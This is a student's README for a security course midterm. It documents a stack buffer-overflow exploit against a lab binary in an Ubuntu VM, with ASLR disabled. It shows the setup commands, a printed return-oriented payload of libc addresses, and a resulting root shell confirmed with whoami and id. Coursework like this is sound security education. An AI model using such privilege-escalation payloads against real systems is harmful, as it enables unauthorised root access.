# CIS5370 Midterm

- Student: Elijah Lieu
- Professor: Dr. Xin Liu

I used multipass to create an Ubuntu VM.

```sh
multipass launch --name midterm
multipass transfer stack.c midterm:/home/ubuntu
multipass shell midterm
```

Set up within the VM:
```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
sudo apt install make gcc gdb
make
```

If you want to recreate the payload or see how I did it, please consult the comments in solve.py.

Otherwise, you can just run
```sh
python3 solve.py
./stack
```

Here is the output when you run this:
```sh
ubuntu@midterm:~$ python3 solve.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2X\xc4\xf7\xff\x7f\x00\x00BBBBBBBBBBBBBBBBBBBBBBBB[\xf7\xd0\xf7\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/\x88\xc2\xf7\xff\x7f\x00\x00\x90\xea\xd0\xf7\xff\x7f\x00\x00[\xf7\xd0\xf7\xff\x7f\x00\x00/\xb4\xdc\xf7\xff\x7f\x00\x00/\x88\xc2\xf7\xff\x7f\x00\x00P\x87\xc5\xf7\xff\x7f\x00\x00[\xf7\xd0\xf7\xff\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0{\xc4\xf7\xff\x7f\x00\x00'
ubuntu@midterm:~$ ./stack
# whoami
root
# id
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),105(lxd)
#
```
